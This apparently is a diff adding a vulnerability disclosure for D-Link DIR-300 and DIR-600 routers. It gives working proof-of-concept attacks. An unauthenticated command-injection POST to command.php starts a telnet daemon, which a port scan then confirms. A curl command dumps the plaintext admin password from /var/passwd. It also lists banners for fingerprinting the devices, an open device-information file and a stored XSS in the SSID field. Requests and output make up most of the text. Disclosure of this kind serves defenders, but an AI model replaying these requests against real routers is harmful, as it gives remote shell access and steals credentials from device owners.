@@ -1,0 +1,87 @@
+============ Vulnerability Overview: ============
+
+    * OS Command Injection (unauthenticated) 
+
+
+starting a telnet server:
+Request:
+POST /command.php HTTP/1.1
+Host: 192.168.178.222
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://www.example.com/
+Content-Length: 15
+Cookie: uid=hfaiGzkB4z
+Pragma: no-cache
+Cache-Control: no-cache
+
+cmd=telnetd;
+
+
+
+Nmap Scan after starting the telnetd:
+Nmap scan report for www.example.com
+Host is up (0.022s latency).
+Not shown: 995 closed ports
+PORT      STATE    SERVICE VERSION
+1/tcp     filtered tcpmux
+23/tcp    open     telnet  BusyBox telnetd 1.14.1 <<==!!!
+<snip>
+
+
+    * Information disclosure: 
+
+Nice server banner to detect this type of devices easily:
+Server: Linux, HTTP/1.1, DIR-300 Ver 2.12
+Server: Linux, HTTP/1.1, DIR-600 Ver 2.12
+
+
+    * Insecure Cryptographic Storage: 
+
+There is no password hashing implemented and so it is saved in plain text on the system:
+# cat var/passwd
+"admin" "test" "0"
+
+root@bt:~# curl --data "cmd=cat /var/passwd" http://www.example.com/command.php
+"admin" "THESECRETPASS" "0"
+root@bt:~#
+
+    * Information Disclosure: 
+
+Detailed device information including Model Name, Hardware Version, Linux Kernel, Firmware version, Language and MAC Addresses are available via the network.
+
+Request:
+http://www.example.com/DevInfo.txt
+
+or try to access version.txt and have a look at the html source ;)
+
+Response:
+HTTP/1.1 200 OK
+Server: Linux, HTTP/1.1, DIR-600 Ver 2.14
+Date: Fri, 31 Dec 1999 18:04:13 GMT
+Content-Length: 267
+
+Firmware External Version: V2.14
+Firmware Internal Version: d1mg
+Model Name: DIR-600
+Hardware Version: Bx
+WLAN Domain: 826
+Kernel: 2.6.33.2
+Language: en
+Graphcal Authentication: Disable
+LAN MAC: <snip>
+WAN MAC: <snip>
+WLAN MAC: <snip>
+
+
+    * Stored XSS via WLAN Assistent and Version Details 
+
+Injecting scripts into the parameter SSID reveals that this parameter is not properly validated for malicious input.
+
+=> Parameter: SSID
+
+http://www.example.com/version.txt
